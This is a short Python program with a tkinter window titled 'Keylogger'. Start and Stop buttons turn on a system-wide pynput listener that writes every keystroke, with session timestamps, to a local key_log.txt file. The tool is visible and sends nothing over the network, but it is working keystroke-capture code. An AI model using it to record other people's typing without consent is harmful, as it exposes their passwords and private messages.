import pynput
import tkinter as tk
import datetime

log_file = None
listener = None

def on_press(key):
    log_file.write(str(key) + "\n")

def start_logging():
    global log_file, listener
    log_file = open("key_log.txt", "a")
    log_file.write("---------Session:"+str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))+"---------\n")
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    start_button.config(state="disabled")
    stop_button.config(state="normal")
    status_label.config(text="Logging started")

def stop_logging():
    global listener
    listener.stop()
    global log_file
    log_file.write("---------------------------------------------\n")
    log_file.close()
    start_button.config(state="normal")
    stop_button.config(state="disabled")
    status_label.config(text="Logging stopped")

root = tk.Tk()
root.geometry("250x250")
root.title("Keylogger")
root.config(bg='grey')
start_button = tk.Button(root, text="Start Logging", command=start_logging, state="normal", highlightthickness=1,relief="solid", overrelief='groove')
start_button.pack()
start_button.place(relx=0.5, rely=0.42, anchor='center')
stop_button = tk.Button(root, text="Stop Logging", command=stop_logging, state="disabled", highlightthickness=1, relief="solid", overrelief='groove')
stop_button.pack()
stop_button.place(relx=0.5, rely=0.58, anchor='center')
status_label = tk.Label(root, text="Not logging", anchor="w")
status_label.pack(side="bottom", fill="x")

root.mainloop()
